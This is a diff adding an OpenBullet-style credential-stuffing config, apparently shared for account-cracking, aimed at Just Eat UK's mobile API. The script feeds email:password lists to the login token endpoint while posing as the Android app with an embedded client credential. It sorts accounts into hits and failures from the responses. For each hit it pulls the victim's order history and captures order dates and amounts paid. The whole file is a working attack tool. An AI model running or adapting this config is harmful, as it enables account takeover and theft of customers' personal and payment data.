@@ -1,0 +1,59 @@
+[SETTINGS]
+{
+  "Name": "JustEat UK",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-04T15:08:01.7698829+01:00",
+  "AdditionalInfo": "",
+  "Author": "Spaceman",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://public.je-apis.com/identity/connect/token" 
+  CONTENT "scope=openid%20mobile_scope%20offline_access&grant_type=password&username=<USER>&password=<PASS>&acr_values=tenant%3AUK%20device%3AeyJEZXZpY2VUeXBlIjoiQW5kcm9pZCIsIkRldmljZU5hbWUiOiJTTS1HOTI1RiIsIkRldmljZUlkIjoiNzA2N2ZjYzQtMWEwYS00MGRmLWIzZTAtNWE2Zjk5YjlkOWY4In0%3D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G925F Build/JLS36C)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "ADRUM_1: isMobile:true" 
+  HEADER "ADRUM: isAjax:true" 
+  HEADER "Authorization: Basic bW9iaWxlX25hdGl2ZTo0NTQ1ZjQ5Yy1mY2U0LTRlYWQtODUxNC1lYzRmODU2MDliNWI=" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"access_token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "description\":\"username or password does not match" 
+PARSE "<SOURCE>" LR "{\"access_token\":\"" "\",\"expires_in" -> VAR "token" 
+REQUEST GET "https://public.je-apis.com/consumer/me/orders?pagination=" 
+  
+  HEADER "User-Agent: [JUST-EAT-APP/6.3.0.73532/Android - SM-G925F - 5.1.1 (API 22)]" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Version: 2018-09" 
+  HEADER "Requires-Bearer-Auth: true" 
+  HEADER "Accept-Language: en-GB" 
+  HEADER "Accept-Charset: utf-8" 
+  HEADER "Accept-Tenant: UK" 
+  HEADER "Application-Id: 4" 
+  HEADER "Application-Version: 6.3.0.73532" 
+  HEADER "Authorization: Bearer <token>" 
+  HEADER "ADRUM_1: isMobile:true" 
+  HEADER "ADRUM: isAjax:true" 
+PARSE "<SOURCE>" LR "createdAt\":\"" "\",\"canReorder" Recursive=TRUE -> CAP "Order Placed :" 
+PARSE "<SOURCE>" LR "totalPaid\":" "},\"payments" Recursive=TRUE -> CAP "Price : " "£" "" 
